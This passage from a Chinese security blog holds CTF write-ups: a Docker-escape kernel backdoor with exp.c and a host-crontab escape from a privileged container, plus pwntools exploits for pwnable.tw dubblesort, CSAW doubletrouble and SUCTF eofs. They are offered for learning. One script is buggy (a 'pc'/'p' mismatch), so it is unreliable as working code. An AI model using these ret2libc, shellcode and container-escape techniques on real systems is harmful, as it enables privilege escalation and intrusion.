<span class="number">1L</span>L);</span><br><span class="line">  copy_to_user(user_buf, v5, v4);</span><br><span class="line">  mutex_unlock(&amp;lock);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>write函数是我们分析的重点，程序根据我们发送的字符串的第一个字节进行switch case，-1则将用户输入拷贝到<em>（&amp;note+1），-2则将用户输入拷贝到hack(此时可以覆盖hack+8地址处的值)，不为-3或者</em>(hack+8)==1会给<em>(&amp;note+1)处分配一块指定大小的内存，否则(choice==-3且</em>(hack+8)==0)执行后门代码，弹计算器，如果choice==0则释放*(&amp;note+1)，因此最后只要满足后门条件即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">de_write</span><span class="params">(__int64 a1, <span class="keyword">char</span> *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *from_1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  __int64 write_size; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// al</span></span><br><span class="line">  __int64 chunk_addr; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  __int64 v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v14; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v16; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, from);</span><br><span class="line">  from_1 = from;</span><br><span class="line">  write_size = size;</span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  mutex_lock(&amp;lock);</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8)*from;</span><br><span class="line">  printk(<span class="string">"order:%d"</span>, v5);</span><br><span class="line">  v6 = *from_1;</span><br><span class="line">  <span class="keyword">if</span> ( *from_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">0xFF</span>u )                          <span class="comment">// write note</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(<span class="string">"note write\n"</span>, v5);</span><br><span class="line">      v13 = *((_QWORD *)&amp;note + <span class="number">1</span>);</span><br><span class="line">      _check_object_size(*((_QWORD *)&amp;note + <span class="number">1</span>), write_size - <span class="number">1</span>, <span class="number">0L</span>L);<span class="comment">// check(dst,count,false)</span></span><br><span class="line">      copy_from_user(v13, from_1 + <span class="number">1</span>, write_size - <span class="number">1</span>);</span><br><span class="line">      printk(<span class="string">"write contents compelete\n"</span>, from_1 + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v6 == <span class="number">0xFE</span>u )                     <span class="comment">// write hack</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(<span class="string">"note write magic %ld\n"</span>, write_size);</span><br><span class="line">      v12 = hack;</span><br><span class="line">      _check_object_size(hack, write_size - <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">      copy_from_user(v12, from_1 + <span class="number">1</span>, write_size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v6 != <span class="number">0xFD</span>u || *(_BYTE *)(hack + <span class="number">8</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(<span class="string">"note malloc\n"</span>, v5);</span><br><span class="line">      note = *from_1;</span><br><span class="line">      printk(<span class="string">"write size compelete\n"</span>, v5);</span><br><span class="line">      chunk_addr = _kmalloc((<span class="keyword">unsigned</span> __int8)note, <span class="number">0x14000C0</span>LL);<span class="comment">// kmalloc(size,flags)</span></span><br><span class="line">      v8 = (<span class="keyword">unsigned</span> __int8)note;</span><br><span class="line">      *((_QWORD *)&amp;note + <span class="number">1</span>) = chunk_addr;</span><br><span class="line">      printk(<span class="string">"malloc size compelete:%d @ %p\n"</span>, v8);<span class="comment">// leak heap addr</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = prepare_kernel_cred(<span class="number">0L</span>L);           <span class="comment">// 0xfd</span></span><br><span class="line">      commit_creds(v10);</span><br><span class="line">      v14 = <span class="string">"/usr/bin/gnome-calculator"</span>;</span><br><span class="line">      v15 = <span class="number">0L</span>L;</span><br><span class="line">      v11 = call_usermodehelper(<span class="string">"/usr/bin/gnome-calculator"</span>, &amp;v14, envp_26376, <span class="number">1L</span>L);</span><br><span class="line">      printk(<span class="string">"RC is: %i \n"</span>, v11);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">"note free\n"</span>, v5);</span><br><span class="line">    kfree(*((_QWORD *)&amp;note + <span class="number">1</span>));              <span class="comment">// double free</span></span><br><span class="line">  &#125;</span><br><span class="line">  mutex_unlock(&amp;lock);</span><br><span class="line">  <span class="keyword">return</span> write_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先用一次写清空hack+8的值，之后choice=0xfd调用后门弹计算器</p>
<h2 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/de"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> *user_buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    user_buf[<span class="number">0</span>] = <span class="string">'\xfe'</span>;</span><br><span class="line">    write(fd,user_buf,<span class="number">0x10</span>);</span><br><span class="line">    user_buf[<span class="number">0</span>] = <span class="string">'\xfd'</span>;</span><br><span class="line">    write(fd,user_buf,<span class="number">0x1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>进入虚拟机，加载漏洞内核模块，启动docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo insmod /home/b/de.ko</span><br><span class="line">sudo docker run -itd --privileged -p 0.0.0.0:23:22 d77241e92fe6 /bin/bash -c <span class="string">"/etc/init.d/ssh start;/bin/bash"</span></span><br></pre></td></tr></table></figure>
<p>传输漏洞文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -P23 ./exp* root@localhost</span><br></pre></td></tr></table></figure>
<p>执行exp，成功</p>
<p><img src="/2019/12/12/docker_escape/1.jpg" alt="success"></p>
<p>调试docker好像没有直接的方法，我这里是在宿主系统里找到内核文件(/boot/vmlinuz-4.15.0-54-generic)，拷贝到我的另一台虚拟机上，使用qemu进行调试。</p>
<p>调试脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-54-generic \</span><br><span class="line">-initrd  ./initramfs.img \</span><br><span class="line">-append <span class="string">"noexec rdinit=./linuxrc"</span> \</span><br><span class="line">-gdb tcp::1234</span><br></pre></td></tr></table></figure>
<p>想要vmlinux的话可以用github的extract脚本提取，这里用不到，启动qemu之后要先查找各种地址</p>
<p><img src="/2019/12/12/docker_escape/2.jpg" alt="addr"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /proc/kallsyms | grep de_write</span><br><span class="line">cat /proc/kallsyms | grep hack</span><br><span class="line">cat /sys/module/de/sections/.text</span><br></pre></td></tr></table></figure>
<p>之后启动gdb，<code>set arch i386:x86-64:intel</code>设置模拟的架构，<code>target remote localhost:1234</code>调试内核，<code>add-symbol-file ./de.ko 0xffffffffc03b0000</code>添加符号表，</p>
<p>刚才我们查找到的hack地址为0xffffffffc03b2500，我们断点下在de_write，continue，在qemu里执行exp，可以看到已经能从gdb断住了，*(hack+8)为1</p>
<p><img src="/2019/12/12/docker_escape/3.jpg" alt="debug"></p>
<p>我们再continue一下，第一次的覆写完成，成功改为0</p>
<p><img src="/2019/12/12/docker_escape/4.jpg" alt="first"></p>
<p>在0x118处下个断点(commit_creds)，成功执行到这里，说明exp执行成功</p>
<p><img src="/2019/12/12/docker_escape/5.jpg" alt="second"></p>
<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>看到知世师傅<a href="https://nightrainy.github.io/2019/10/31/play-with-docker/" target="_blank" rel="noopener">知世</a>的博客，学到了新的姿势。</p>
<p>docker开启–privileged的情况下其实docker的root跟外部物理机的root权限已经差不多了，我们可以通过mount挂载宿主机的磁盘到内部，进而修改/etc/crontab通过定时任务弹计算器，注意要设置环境变量display=0，注意user要是b(普通用户)，display=0的原因可以参见下文<a href="https://unix.stackexchange.com/questions/193827/what-is-display-0" target="_blank" rel="noopener">display=0</a>，因此只需要在/etc/crontab中加一行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* * * * * b DISPLAY=:0 /usr/bin/gnome-calculator</span><br></pre></td></tr></table></figure></p>
<p>即可每分钟弹一次计算器</p>
<p><img src="/2019/12/12/docker_escape/6.jpg" alt="suc"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>调试的时候遇到一个问题，%p打印的地址不对，高四字节为0,低四字节不知道是什么，查了之后发现%p输出的是散列值，目地就是不泄漏地址，如果真想输出地址可以用%px，涨知识</p>
]]></content>
      <categories>
        <category>云安全CTF</category>
      </categories>
  </entry>
  <entry>
    <title>dubblesort</title>
    <url>/2020/09/03/dubblesort/</url>
    <content><![CDATA[<p>#<br>pwnable.tw/dubblesort</p>
<p>##<br>简介</p>
<p>这是写的第一篇writeup。虽然学了将近一个月pwn，但是还是不得要领，之所以要写这个的writeup，是因为这个很典型，中间用到了绕过canary以及尝试的过程，加上工具的使用，有很强的借鉴意义。</p>
<p>程序比较简单，放到IDA里F5，得到C代码，默认命名辨识度低，把一些重要变量重命名成易于记忆的名字，main函数里<br><img src="/2020/09/03/dubblesort/1.jpg" alt="first_entry"><br>其中canary的值不能发生变化，首先尝试输入amazing，发现输出的除了名字之后还有一些乱码，这是因为read读取的输入以换行结束，并不包含\x00，而printf输出的结束符为\x00，因此在输出名字之后还会继续向后输出，直到’\0’为止。这里是一个可以泄露栈内容的漏洞<br><img src="/2020/09/03/dubblesort/2.jpg" alt="first_try"><br>继续往下测试，发现这是一个对输入数字进行从小到大排序的程序，问题在于它并没有限制输入数字的数量，这就导致用户输入过长时产生栈溢出，在IDA中可以看到程序内部并没有system函数和’/bin/sh’，因此要从动态链接库里找，即构造ret2libc，gdb调试程序,在puts处下断点，输入4个数字，分别为1，2，3，4，在栈上的输入点为[esp+0x5c]，距离ebp的距离为0x7c,因此栈结构设计如下:<br><img src="/2020/09/03/dubblesort/4.jpg" alt="stack"><br>checksec ./dubblesort可以看到栈开启了各种保护，因为不是直接在栈上布置shellcode所以NX的保护没关系，FULL RELRO表示程序开始的时候会动态加载函数表，不能通过替换got表来执行恶意代码，最重要的是PIE和Canary，IDA里可以看到canary和输入点间的距离是0x60，在gdb中验证之后确实也如此<br><img src="/2020/09/03/dubblesort/5.jpg" alt="checksec"><br><img src="/2020/09/03/dubblesort/6.jpg" alt="canary_position"><br>最后的栈结构如下：<br><img src="/2020/09/03/dubblesort/7.jpg" alt="stack_with_canary"></p>
<p>##<br>漏洞利用</p>
<p>###<br>绕过canary</p>
<p>漏洞还是蛮容易找到的，但是对于我这个菜鸡来说各种保护实在是太难绕过了，脚本也不熟，只能一点点尝试。首先canary上的值不能变，目前遇到的可以绕过canary的方法就是地址任意写，在这里我们要覆盖连续的栈空间，这条路走不通，只能是想方法不写到这块地址上，继续尝试输入，发现输入数字为f等非数字时直接停止之后的输入，直接输入结果，gdb调试发现此时栈上的内容没有发生变化，这是因为以%d格式读取字符时发生格式错误，输入无法写入到栈上，但是没有清空缓存区的函数，这个字符就一直留在缓冲区，之后读取都会发生错误，最终的结果就是这次输入之后的结果都无法写入到栈上，这样我们似乎可以通过输入字符绕过canary，但是此后的输入也无法写到栈上，因此要尝试新的输入，最后尝试到’-‘发现为合法输入，但是不写到栈上，正好满足了我们的需求，因此我们前24个输入填充0，第25位输入’+’绕过保护，再填充比canary值大的数，这是因为之后的排序是从小到大排序，直接对整数指针操作，因此我们要保证canary值位置不变，必须按照递增顺序放置元素，在这里我们使用system函数的地址，因为这个地址大部分时间都大于canary的随机数，一直覆盖到ebp,共7个填充，加上最后覆盖的返回地址共8个system_addr</p>
<p>###<br>绕过PIE</p>
<p>绕过PIE的题还没见过，之前学习中讲的是要找到不变的部分，只能gdb慢慢找了。name那里之前提了一个漏洞，可以泄露栈上内容，当然之前说的在输入数字时不改变栈内容也可以泄露内容，但是canary必然会被破坏，因此我们最好利用read泄露地址,查看之后可以看到0xf7fb2000这个值似乎不随输入变化，而且vmmap查看发现这的确是动态链接库的地址,减去起始位置的距离发现偏移量为0x1b0000，使用readelf命令发现这个地址对应的got.plt地址，这样我们就得到了一个固定的got地址，最后，由于printf遇到’\x0’会停止输出，而这个地址最后总为’\0’，因此使用换行符覆盖最后一位，得到的leak地址再减去0x0a即可。<br><img src="/2020/09/03/dubblesort/9.jpg" alt="find addr"><br><img src="/2020/09/03/dubblesort/10.jpg" alt="find_offset"></p>
<p>##<br>payload.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.update(arch=&apos;linux&apos;,os=&apos;i386&apos;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">debug = 0</span><br><span class="line">if debug:</span><br><span class="line">    pc = process(&apos;./dubblesort&apos;)</span><br><span class="line">else:</span><br><span class="line">    pc = remote(&apos;chall.pwnable.tw&apos;, 10101)</span><br><span class="line"></span><br><span class="line">got_off = 0x1b0000</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;a&apos;*24)</span><br><span class="line">got_addr = u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr = got_addr-got_off</span><br><span class="line">system_addr = libc_addr + libc.symbols[&apos;system&apos;]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">p.sendline(&apos;35&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>doubletrouble</title>
    <url>/2020/09/03/doubletrouble/</url>
    <content><![CDATA[<h1 id="casaw-gt-doubletrouble"><a href="#casaw-gt-doubletrouble" class="headerlink" title="casaw-&gt;doubletrouble"></a>casaw-&gt;doubletrouble</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前也遇到了一道类似的题，但是没有涉及到浮点数在内存中的存储，这道题更加综合，也给出来了绕过canary的一种思路，因此详细写一下writeup</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>主函数是game，用户首先输入array的长度，大于64直接崩，但是会打印出system函数的地址，这个地址是不固定的。当小于等于64的时候，用户依次输入数组元素，之后打印数组成员，给出元素之和，最大元素和最小元素，找到出题人喜欢的元素，对数组排序等，挨个查看内部的逻辑，最终可以找到函数异常的部分</p>
<p><img src="/2020/09/03/doubletrouble/1.jpg" alt="function"><br><img src="/2020/09/03/doubletrouble/2.jpg" alt="function2"></p>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在findArray()里，len表示数组长度，当arrary_len小于2倍原数组长度的时候，如果数组元素大于-100而小于-10，就返回这个元素的下标，如果遍历所有的元素均未发现满足此条件的元素，直接返回第一个元素。程序的问题在于每次遍历寻找的时候，都会增加数组的长度，这使得如果找到一个满足条件的元素，数组的长度都会发生变化。当然在这里，还没有显示破坏性。在下面的sortArray里，由于用到array_len判断程序的结束部分，之前增加的array_len会使得排序的部分超过了数组原有部分，且直接修改栈上的值。<br>比如我们输入100、-20、100，第一个元素不满足条件，数组长度变为4，随后的排序中，会将100后面的元素也一同排序，假设后面的值为90，那么就会被替换成100</p>
<p><img src="/2020/09/03/doubletrouble/3.jpg" alt="find_array"><br><img src="/2020/09/03/doubletrouble/4.jpg" alt="sort_array"></p>
<h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>这次栈上的元素都是8字节的double类型，我们想往栈上写数据就要了解数据的表示。在IEEE 754标准下，32位浮点数和64位浮点数的表示如下：（其中S是sign，E为exponet，M为fraction）</p>
<p><img src="/2020/09/03/doubletrouble/5.jpg" alt="data_form"><br><img src="/2020/09/03/doubletrouble/5.png" alt="32_float"><br><img src="/2020/09/03/doubletrouble/6.png" alt="64_double"><br><img src="/2020/09/03/doubletrouble/6.jpg" alt="calc"></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><img src="/2020/09/03/doubletrouble/7.jpg" alt="example"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序开始打印了数组在栈上的地址，我们可以控制返回地址到system函数的地址，后面接参数’/bin//sh’，也可以让程序返回到数组，执行数组里的shellcode，我们挨个尝试一下</p>
<p>因为最后要排序，我们得看下ebp和return addr的大小关系，根据IDA里可看到数组地址为ebp-0x210，64个元素之后就是64*8 = 0x200,因此要再多输入3个元素才能覆盖到返回地址，其中，ebp-0xc存的是canary，不能受排序影响，即第65个元素不变，第66个元素随意，第67个元素为system函数地址，第68个元素为’/bin/sh’，测试发现canary有时候正有时候负，变化很大，看来只能假设它是个比返回地址大的数，这样不会和被替换的返回地址交换。最后发现被替换的部分总是正数，大于-20，因此永远不可能让-20等负数到canary的下面，所以这个方法GG</p>
<p>尝试第二种方式，首先找到system在got表中的地址，之后发现程序中包含’/bin/csh’，结合以前做题的经验，我们知道system(‘sh’)一样可以执行，sh相对于字符串的偏移为25，即0x19，所以’sh’的地址为0x0804A12D，shellcode为:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x804A12D</span><br><span class="line">call dword ptr [0x804BFF0]</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/09/03/doubletrouble/8.jpg" alt="system_got"><br><img src="/2020/09/03/doubletrouble/9.jpg" alt="binsh_addr"></p>
<p>最终栈的结构如下:shellcode + padding + ret_addr<br><img src="/2020/09/03/doubletrouble/10.jpg" alt="ret_addr"></p>
<p>##exp.py<br>因为canary的值老变化，所以最终的exp还是要看脸，要想全自动化可以写个while True然后判断返回结果，这里我自己的exp也没跑通，上个官方的吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__LIBC__ = <span class="string">""</span></span><br><span class="line">__NAME__ = <span class="string">"doubletrouble"</span></span><br><span class="line">__REMOTE__ = <span class="string">"pwn.chal.csaw.io"</span></span><br><span class="line">__REMOTE_PORT__ = <span class="number">9002</span></span><br><span class="line">__GDB__ = <span class="string">"""</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	log.info(<span class="string">"pwning %s"</span>  % __NAME__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> args.REMOTE:</span><br><span class="line"></span><br><span class="line">		log.info(<span class="string">"remote run"</span>)</span><br><span class="line">		r = remote(__REMOTE__, __REMOTE_PORT__)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">		log.info(<span class="string">"local run"</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> args.GDB:</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> args.GDB == <span class="string">'attach'</span>:</span><br><span class="line"></span><br><span class="line">				r = process(<span class="string">"./%s"</span> % __NAME__, env=&#123;<span class="string">'LD_PRELOAD'</span>: __LIBC__&#125;)</span><br><span class="line">				log.info(<span class="string">"attaching gdb..."</span>)</span><br><span class="line">				gdb.attach(r.pid, __GDB__)	</span><br><span class="line"></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">				r = gdb.debug(<span class="string">"./%s"</span> % __NAME__, __GDB__)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">			r = process(<span class="string">"./%s"</span> % __NAME__, env=&#123;<span class="string">'LD_PRELOAD'</span>: __LIBC__&#125;)</span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">	stack = r.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	stack = int(stack, <span class="number">16</span>)</span><br><span class="line">	log.info(<span class="string">"stack 0x%x"</span>, stack)</span><br><span class="line"></span><br><span class="line">	r.sendlineafter(<span class="string">"long: "</span>, str(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">	pad = <span class="string">"%.20g"</span> % unpack(<span class="string">"&lt;d"</span>, p64(<span class="number">0xf8ffffffffffffff</span>))[<span class="number">0</span>]</span><br><span class="line">	jmp  = <span class="number">0x080498A4ffffffff</span> <span class="comment"># ret gadget</span></span><br><span class="line">	jmp2 = <span class="number">0x0806000000000000</span> + stack <span class="comment"># addr of shellcode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sh1 = asm(<span class="string">"push 0x804A12D; jmp $+3"</span>).ljust(<span class="number">8</span>, <span class="string">'\xfe'</span>)</span><br><span class="line">	sh2 = asm(<span class="string">"call dword ptr [0x804BFF0]"</span>).ljust(<span class="number">8</span>, <span class="string">'\xfc'</span>)</span><br><span class="line"></span><br><span class="line">	r.sendline(<span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, sh1)[<span class="number">0</span>])</span><br><span class="line">	r.sendline(<span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, sh2)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">2</span>):</span><br><span class="line">		r.sendline(pad)</span><br><span class="line"></span><br><span class="line">	r.sendline(str(<span class="number">-99</span>))</span><br><span class="line">	r.sendline( <span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, p64(jmp))[<span class="number">0</span>])</span><br><span class="line">	r.sendline( <span class="string">"%.20g"</span> % struct.unpack(<span class="string">"&lt;d"</span>, p64(jmp2))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">64</span><span class="number">-7</span>):</span><br><span class="line">	 	r.sendline( pad)</span><br><span class="line"></span><br><span class="line">	r.sendline(<span class="string">"ls"</span>)</span><br><span class="line">	r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>csaw</category>
      </categories>
  </entry>
  <entry>
    <title>eofs</title>
    <url>/2020/09/03/eofs/</url>
    <content><![CDATA[<h1 id="SUCTF-gt-eofs"><a href="#SUCTF-gt-eofs" class="headerlink" title="SUCTF-&gt;eofs"></a>SUCTF-&gt;eofs</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个招新赛的题目比较简单，去做了几道简单题，这是第一次接触文件的题，现学的文件，最后还是没做出来，中间还是有一些经验，比如看到一个不太正常的函数名(lookForHeader)最好先去查一下这个函数，说不定就是哪个CVE改编来的，看之前的CVE复现或者讲解有利于做题，不能闷头做</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序的main函数里打开了同级目录下的readme.txt，句柄为fd，此时注意fd并不是局部变量，而是位于bss段的0x602180的全局变量，后面从标准输入中读取最多0x1F40-1字节的数据，观察s的位置，并不能覆盖返回地址或者哪里，再往下看su_server</p>
<p><img src="/2020/09/03/eofs/1.jpg" alt="main"></p>
<p>su_server先以时间为种子生成随机数，之后清空host、username和researchfield等几个bss段全局变量的值，其中host地址为0x602220、username地址为0x6021a0、researchfield地址为0x602100.v3随机数先赋值给0x60229F、0x60221F、0x60217F等三个地址，之后用户输入作为参数传入lookForHeader函数，下面if的条件是只要上面三个地址任意一个值不为v3就为真。之前v3已经被赋值了，这里不再相等要么溢出到v3修改掉，要么之前的三个地址里有一个被覆写掉。亦或者有个地址任意写最好。假设现在进了条件，要进入secret()拿到shell，还得让fd-&gt;_flag == 0xdeadbeef，即0x602180的值为0xdeadbeef的地址，观察一下地址之间的差值，发现是可以通过覆写host、username、researchfield的值来改掉三个变量，只要lookForHeader里的函数有溢出漏洞即可，并且由于fd和researchfield之间为0x80的距离，是很有可能被溢出的，下面继续看lookForHeader</p>
<p><img src="/2020/09/03/eofs/2.jpg" alt="su_server"></p>
<p>lookForHeader其实是一个CVE里的漏洞函数，做题的时候没有去查蛮遗憾，但是实际上这个函数也并不难理解，是自己的逆向的水平太低，看代码看不来，以后需要提高这方面的水平.</p>
<p>lookForHeader的注释标注了逻辑，也就是说我们需要构造几个相同格式的字符串部分以造成溢出，进而覆写fd</p>
<p><img src="/2020/09/03/eofs/3.jpg" alt="lookForHeader"><br><img src="/2020/09/03/eofs/4.jpg" alt="lookForHeader2"></p>
<h2 id="数据构造"><a href="#数据构造" class="headerlink" title="数据构造"></a>数据构造</h2><p>首先绕过su_server里的srncmp，即payload = ‘GET / HT’,看起来好看一点的话就全留下来好了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload = &apos;GET / HTTP/1.1#&apos;</span><br><span class="line">payload += &apos;Host:127.0.0.1#&apos;</span><br><span class="line">payload += &apos;Username:xmzyshypnc#&apos;</span><br><span class="line">payload += &apos;ResearchField:&apos;</span><br><span class="line">payload += p64(0xdeadbeef)</span><br><span class="line">payload += &apos;a&apos;*0x38+&apos;#&apos;</span><br><span class="line">payload += &apos;ResearchField:&apos;+&apos;a&apos;*0x40+p64(0x602100)+&apos;#&apos;</span><br></pre></td></tr></table></figure></p>
<p>又因为0x60217F在溢出范围内，所以if也可以进去，下面是exp</p>
